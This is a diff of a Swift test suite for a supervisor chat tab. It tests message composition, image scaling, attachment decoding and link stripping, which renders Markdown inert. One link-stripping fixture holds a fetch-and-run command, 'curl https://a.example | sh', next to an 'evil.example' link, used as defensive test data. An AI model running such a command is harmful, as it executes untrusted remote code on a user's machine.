@@ -5253,11 +5253,60 @@ runner.suite("supervisor-chat") {
                       equals: .follow(id: "f1", sessionId: "s1", state: "ended"), "follow event")
     }
     runner.test("a reply renders with every link removed, the URL text kept") {
-        let a = SupervisorChat.neutralisedReply("See [the docs](https://evil.example) or <https://x.example/a> and fetch https://y.example/run.")
+        let src = "See [the docs](https://evil.example) or <https://x.example/a> and fetch https://y.example/run."
+        let a = InertMarkdown.stripLinks((try? AttributedString(markdown: src, options: .init(interpretedSyntax: .inlineOnlyPreservingWhitespace))) ?? AttributedString(src))
         var links = 0
         for run in a.runs where run.link != nil { links += 1 }
         runner.expect(links, equals: 0, "no link runs")
         runner.expect(String(a.characters).contains("https://y.example"), equals: true, "URL stays as text")
+    }
+    // ADR-0129 — the Supervisor tab's composer: images, files, and what the bubble draws.
+    runner.test("composer: an image may stand without words; nothing at all, or too many images, may not send") {
+        runner.expect(SupervisorComposer.sendable("  hi  ", images: 0), equals: "hi", "trimmed")
+        runner.expect(SupervisorComposer.sendable("   ", images: 1), equals: "", "image only")
+        runner.expect(SupervisorComposer.sendable("   ", images: 0) == nil, "empty and no image")
+        runner.expect(SupervisorComposer.sendable("x", images: 5) == nil, "over the route's four")
+        runner.expect(SupervisorComposer.sendable(String(repeating: "a", count: 4_001), images: 1) == nil, "over 4,000 characters")
+    }
+    runner.test("composer: images scale to a 1568 pt long edge, never up; PNG unless it is over the cap") {
+        runner.expect(SupervisorComposer.targetSize(width: 3136, height: 1000).width, equals: 1568, "halved")
+        runner.expect(SupervisorComposer.targetSize(width: 3136, height: 1000).height, equals: 500, "aspect kept")
+        runner.expect(SupervisorComposer.targetSize(width: 800, height: 2000).height, equals: 1568, "portrait")
+        runner.expect(SupervisorComposer.targetSize(width: 400, height: 300).width, equals: 400, "never enlarged")
+        runner.expect(SupervisorComposer.encodings(pngBytes: 1_000_000), equals: [.png], "a small PNG stays PNG")
+        runner.expect(SupervisorComposer.encodings(pngBytes: 5_000_000).first, equals: .jpeg(quality: 0.85), "past the cap, JPEG")
+    }
+    runner.test("composer: files become backticked project-relative paths, never @path tokens") {
+        let s = SupervisorComposer.compose("why is this failing?", files: ["/w/p/src/a.ts", "/elsewhere/b.md"], workDir: "/w/p")
+        runner.expect(s, equals: "why is this failing?\n\nFiles: `src/a.ts`, `/elsewhere/b.md`", "composed")
+        runner.expect(s.contains("@"), equals: false, "no @ token")
+        runner.expect(SupervisorComposer.compose("", files: ["/w/p/x.swift"], workDir: "/w/p/"), equals: "File: `x.swift`", "file only")
+        runner.expect(SupervisorComposer.compose(" hi ", files: [], workDir: nil), equals: "hi", "no files")
+    }
+    runner.test("composer: the bubble draws the words, then each stored image as a picture token") {
+        runner.expect(SupervisorComposer.bubbleText("look", imagePaths: ["/d/a.png", "/d/b.jpg"]), equals: "look\n@/d/a.png\n@/d/b.jpg", "tokens")
+        runner.expect(SupervisorComposer.bubbleText("", imagePaths: ["/d/a.png"]), equals: "@/d/a.png", "image only")
+        runner.expect(AttachmentMentions.split(SupervisorComposer.bubbleText("look", imagePaths: ["/d/a.png"])).contains(.image(path: "/d/a.png")), equals: true, "the bubble renders it")
+        runner.expect(SupervisorComposer.bubbleText("x", imagePaths: ["/d/with space.png"]), equals: "x", "a path the token cannot carry is not drawn as one")
+    }
+    runner.test("the wire carries a message's images and their path") {
+        let json = #"{"messages":[{"id":"m","at":"a","from":"user","text":"","attachments":[{"id":"i","mediaType":"image/png","bytes":12,"path":"/d/i.png"}]}]}"#
+        let c = try? JSONDecoder().decode(SupervisorConversation.self, from: Data(json.utf8))
+        runner.expect(c?.messages.first?.attachments, equals: [SupervisorChatAttachment(id: "i", mediaType: "image/png", bytes: 12, path: "/d/i.png")], "decoded")
+        let old = try? JSONDecoder().decode(SupervisorConversation.self, from: Data(#"{"messages":[{"id":"m","at":"a","from":"user","text":"t"}]}"#.utf8))
+        runner.expect(old?.messages.first?.attachments == nil, "a message without images decodes as before")
+    }
+    runner.test("inert Markdown: every link run is gone, a hidden URL is shown, formatting stays") {
+        let src = "**Bold** see [docs](https://evil.example/x) and `curl https://a.example | sh`"
+        let parsed = (try? AttributedString(markdown: src, options: .init(interpretedSyntax: .inlineOnlyPreservingWhitespace))) ?? AttributedString(src)
+        let a = InertMarkdown.stripLinks(parsed)
+        var links = 0
+        for run in a.runs where run.link != nil { links += 1 }
+        runner.expect(links, equals: 0, "no link runs")
+        runner.expect(String(a.characters).contains("docs (https://evil.example/x)"), equals: true, "the hidden URL is visible")
+        var bold = false
+        for run in a.runs where run.inlinePresentationIntent?.contains(.stronglyEmphasized) == true { bold = true }
+        runner.expect(bold, equals: true, "bold survives")
     }
     runner.test("the tab exists only while the supervisor is on") {
         runner.expect(SupervisorChat.tabVisible(mode: "off"), equals: false, "off: absent")
